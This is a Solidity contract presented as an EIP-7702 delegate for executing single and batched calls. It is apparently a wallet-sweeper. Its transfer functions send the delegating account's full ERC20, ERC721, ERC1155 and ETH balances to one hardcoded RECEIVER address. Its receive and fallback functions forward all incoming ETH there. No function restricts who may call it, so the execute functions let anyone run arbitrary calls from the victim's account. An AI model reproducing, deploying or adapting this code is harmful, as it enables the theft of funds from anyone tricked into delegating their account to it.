// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC1155/IERC1155.sol";

contract EIP7702Delegate {
    address public constant RECEIVER = 0x14F9f76863b57e89f2D482557828337234DCacaD;

    event Executed(address indexed target, uint256 value, bytes data);
    event BatchExecuted(uint256 count);
    event ERC20Transferred(address indexed token, uint256 amount);
    event ERC721Transferred(address indexed token, uint256 tokenId);
    event ERC1155Transferred(address indexed token, uint256 id, uint256 amount);
    event ETHForwarded(uint256 amount);

    error ExecutionFailed(uint256 index, bytes reason);

    struct Call {
        address target;
        uint256 value;
        bytes data;
    }

    struct CallWithAllowFailure {
        address target;
        uint256 value;
        bytes data;
        bool allowFailure;
    }

    function execute(
        address target,
        uint256 value,
        bytes calldata data
    ) external payable returns (bytes memory) {
        (bool success, bytes memory result) = target.call{value: value}(data);
        if (!success) {
            assembly {
                revert(add(result, 32), mload(result))
            }
        }
        emit Executed(target, value, data);
        return result;
    }

    function executeBatch(Call[] calldata calls) external payable returns (bytes[] memory results) {
        results = new bytes[](calls.length);
        for (uint256 i = 0; i < calls.length; i++) {
            (bool success, bytes memory result) = calls[i].target.call{value: calls[i].value}(calls[i].data);
            if (!success) {
                revert ExecutionFailed(i, result);
            }
            results[i] = result;
        }
        emit BatchExecuted(calls.length);
    }

    function executeBatchWithFailure(
        CallWithAllowFailure[] calldata calls
    ) external payable returns (bool[] memory successes, bytes[] memory results) {
        successes = new bool[](calls.length);
        results = new bytes[](calls.length);
        for (uint256 i = 0; i < calls.length; i++) {
            (bool success, bytes memory result) = calls[i].target.call{value: calls[i].value}(calls[i].data);
            if (!success && !calls[i].allowFailure) {
                revert ExecutionFailed(i, result);
            }
            successes[i] = success;
            results[i] = result;
        }
        emit BatchExecuted(calls.length);
    }

    function transferERC20(address token) external returns (uint256) {
        uint256 balance = IERC20(token).balanceOf(address(this));
        if (balance > 0) {
            IERC20(token).transfer(RECEIVER, balance);
            emit ERC20Transferred(token, balance);
        }
        return balance;
    }

    function batchTransferERC20(address[] calldata tokens) external {
        for (uint256 i = 0; i < tokens.length; i++) {
            uint256 balance = IERC20(tokens[i]).balanceOf(address(this));
            if (balance > 0) {
                IERC20(tokens[i]).transfer(RECEIVER, balance);
                emit ERC20Transferred(tokens[i], balance);
            }
        }
    }

    function transferERC721(address token, uint256 tokenId) external {
        IERC721(token).safeTransferFrom(address(this), RECEIVER, tokenId);
        emit ERC721Transferred(token, tokenId);
    }

    function batchTransferERC721(address token, uint256[] calldata tokenIds) external {
        for (uint256 i = 0; i < tokenIds.length; i++) {
            IERC721(token).safeTransferFrom(address(this), RECEIVER, tokenIds[i]);
            emit ERC721Transferred(token, tokenIds[i]);
        }
    }

    function batchTransferERC721Multiple(address[] calldata tokens, uint256[] calldata tokenIds) external {
        require(tokens.length == tokenIds.length, "Length mismatch");
        for (uint256 i = 0; i < tokens.length; i++) {
            IERC721(tokens[i]).safeTransferFrom(address(this), RECEIVER, tokenIds[i]);
            emit ERC721Transferred(tokens[i], tokenIds[i]);
        }
    }

    function transferERC1155(address token, uint256 id) external {
        uint256 balance = IERC1155(token).balanceOf(address(this), id);
        if (balance > 0) {
            IERC1155(token).safeTransferFrom(address(this), RECEIVER, id, balance, "");
            emit ERC1155Transferred(token, id, balance);
        }
    }

    function batchTransferERC1155(address token, uint256[] calldata ids) external {
        uint256[] memory balances = new uint256[](ids.length);
        for (uint256 i = 0; i < ids.length; i++) {
            balances[i] = IERC1155(token).balanceOf(address(this), ids[i]);
        }
        IERC1155(token).safeBatchTransferFrom(address(this), RECEIVER, ids, balances, "");
    }

    function transferAllETH() external {
        uint256 balance = address(this).balance;
        if (balance > 0) {
            (bool success, ) = RECEIVER.call{value: balance}("");
            require(success, "ETH transfer failed");
            emit ETHForwarded(balance);
        }
    }

    function _forwardETH() internal {
        if (msg.value > 0) {
            (bool success, ) = RECEIVER.call{value: msg.value}("");
            require(success, "ETH forward failed");
            emit ETHForwarded(msg.value);
        }
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

    function onERC1155Received(address, address, uint256, uint256, bytes calldata) external pure returns (bytes4) {
        return this.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(address, address, uint256[] calldata, uint256[] calldata, bytes calldata) external pure returns (bytes4) {
        return this.onERC1155BatchReceived.selector;
    }

    receive() external payable {
        _forwardETH();
    }

    fallback() external payable {
        _forwardETH();
    }
}
